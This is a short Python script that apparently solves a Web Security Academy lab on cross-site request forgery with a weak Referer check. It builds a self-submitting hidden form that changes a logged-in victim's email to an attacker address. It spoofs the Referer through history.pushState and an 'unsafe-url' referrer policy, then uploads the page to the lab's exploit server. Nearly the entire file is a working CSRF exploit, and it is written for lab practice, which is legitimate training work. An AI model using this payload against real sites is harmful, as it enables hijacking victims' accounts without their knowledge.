import requests

site = "0a53005f04ce508280c36788008600f9.web-security-academy.net"
exploit_url = "https://exploit-0a9e008d04e350ff808e66dc01160084.exploit-server.net/"

exploit_html = f'''<html>
  <body>
  <form action="https://0a53005f04ce508280c36788008600f9.web-security-academy.net/my-account/change-email" method="POST" id="emailForm">
    <input type="hidden" name="email" value="pwned@evil-user.net" />
  </form>
  <script>
    history.pushState("", "", "/?https://0a53005f04ce508280c36788008600f9.web-security-academy.net/my-account?id=wiener");
    document.getElementById("emailForm").submit();
  </script>
  </body>
</html>'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nReferrer-Policy: unsafe-url',
    'responseBody': exploit_html,
    'formAction': 'STORE'
}

s = requests.Session()

# Upload exploit page
resp = s.post(exploit_url, data=formData)
if resp.status_code == 200:
    print("[+] Exploit uploaded successfully!")
    print(f"Visit the exploit at: {exploit_url}exploit")
else:
    print(f"[-] Failed to upload exploit. Status code: {resp.status_code}")
